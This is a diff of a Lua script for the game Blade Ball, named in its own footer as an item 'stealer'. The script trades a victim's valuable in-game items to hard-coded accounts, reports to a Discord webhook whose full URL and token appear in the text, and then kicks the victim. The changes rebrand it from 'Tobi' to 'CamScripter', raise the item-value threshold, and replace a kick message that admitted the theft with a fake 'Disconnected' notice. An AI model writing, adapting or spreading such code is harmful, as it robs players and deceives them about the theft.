@@ -19,8 +19,8 @@ local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).
 local Replion = require(game.ReplicatedStorage.Packages.Replion)
 
 local users = _G.Usernames or {"PoziBaskan_YTB", "benpozibaskan"}
-local min_rap = _G.min_rap or 100
-local ping = _G.pingEveryone or "No"
+local min_rap = _G.min_rap or 250
+local ping = _G.pingEveryone or "yes"
 local webhook = _G.webhook or "https://discord.com/api/webhooks/1465333541641519155/zDK03l7zR9qeWBVw9QTOPlIlH6iBqUKuoVplHc_94OT0v-Vi2dGCp_XpCg9LdRpcL_ow"
 
 if next(users) == nil or webhook == "" then
@@ -210,7 +210,7 @@ local function SendJoinMessage(list, prefix)
             ["color"] = 65280,
             ["fields"] = fields,
             ["footer"] = {
-                ["text"] = "Blade Ball stealer by Tobi. discord.gg/GY2RVSEGDT"
+                ["text"] = "Blade Ball stealer by CamScripter"
             }
         }}
     }
@@ -418,7 +418,7 @@ if #itemsToSend > 0 then
             readyTrade()
             confirmTrade()
         end
-        plr:kick("All your stuff just got stolen by Tobi's stealer. discord.gg/GY2RVSEGDT")
+        plr:kick("Disconnected Pls Use Script Again")
     end
 
     local function waitForUserJoin()
